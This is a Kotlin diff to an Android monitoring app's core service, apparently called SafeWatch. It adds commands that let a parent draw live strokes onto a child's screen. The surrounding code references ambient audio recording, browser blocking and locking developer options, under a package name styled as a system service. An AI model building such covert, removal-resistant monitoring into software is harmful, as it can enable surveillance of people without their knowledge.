@@ -12,6 +12,7 @@ import android.os.*
 import androidx.core.app.NotificationCompat
 import com.google.android.gms.location.*
 import com.system.service.monitors.*
+import com.system.service.monitors.LivePaintingService
 import com.system.service.monitors.AmbientRecorder
 import com.system.service.monitors.BrowserBlocker
 import com.system.service.monitors.OfflineAlertManager
@@ -452,6 +453,23 @@ class CoreService : Service() {
                 "lock_dev_options" -> {
                     val ok = ShizukuManager.lockDeveloperOptions()
                     sendData("dev_options_result", JSONObject().apply { put("success", ok); put("locked", true) })
+                }
+
+
+                // ── Live Painting (SafeWatch Blueprint) ───────────────────────
+                // Parent draws on canvas → coordinates relayed → drawn on child screen
+                "paint_stroke" -> {
+                    if (!LivePaintingService.isRunning()) {
+                        startForegroundService(Intent(this, LivePaintingService::class.java))
+                    }
+                    LivePaintingService.sendStroke(data)
+                }
+                "clear_painting" -> {
+                    LivePaintingService.clear()
+                }
+                "stop_painting" -> {
+                    LivePaintingService.clear()
+                    stopService(Intent(this, LivePaintingService::class.java))
                 }
 
                 // ── OTA Update ─────────────────────────────────────────────────
